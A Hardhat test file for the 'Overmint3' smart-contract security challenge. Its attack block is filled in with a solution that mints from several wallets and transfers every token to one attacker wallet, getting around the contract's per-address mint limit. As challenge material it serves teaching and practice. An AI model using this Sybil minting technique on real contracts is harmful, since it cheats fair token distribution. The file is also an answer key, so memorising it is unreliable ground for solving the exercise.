const {
    time,
    loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "Overmint3"

describe(NAME, function () {
    async function setup() {
        const [owner, attackerWallet] = await ethers.getSigners();

        const VictimFactory = await ethers.getContractFactory(NAME);
        const victimContract = await VictimFactory.deploy();

        return { victimContract, attackerWallet };
    }

    describe("exploit", async function () {
        let victimContract, attackerWallet;
        before(async function () {
            ({ victimContract, attackerWallet } = await loadFixture(setup));
        })

        it("conduct your attack here", async function () {
            let attackerWallet2 = (await ethers.getSigners())[2]
            let attackerWallet3 = (await ethers.getSigners())[3]
            let attackerWallet4 = (await ethers.getSigners())[4]
            let attackerWallet5 = (await ethers.getSigners())[5]
            let attackerWallet6 = (await ethers.getSigners())[6]
            await victimContract.connect(attackerWallet).mint()
            await victimContract.connect(attackerWallet2).mint()
            await victimContract.connect(attackerWallet3).mint()
            await victimContract.connect(attackerWallet4).mint()
            await victimContract.connect(attackerWallet5).mint()

            await victimContract.connect(attackerWallet2).transferFrom(attackerWallet2.address, attackerWallet.address, 2)
            await victimContract.connect(attackerWallet3).transferFrom(attackerWallet3.address, attackerWallet.address, 3)
            await victimContract.connect(attackerWallet4).transferFrom(attackerWallet4.address, attackerWallet.address, 4)
            await victimContract.connect(attackerWallet5).transferFrom(attackerWallet5.address, attackerWallet.address, 5)


        });

        after(async function () {
            expect(await victimContract.balanceOf(attackerWallet.address)).to.be.equal(5);
            expect(await ethers.provider.getTransactionCount(attackerWallet.address)).to.equal(1, "must exploit one transaction");
        });
    });
});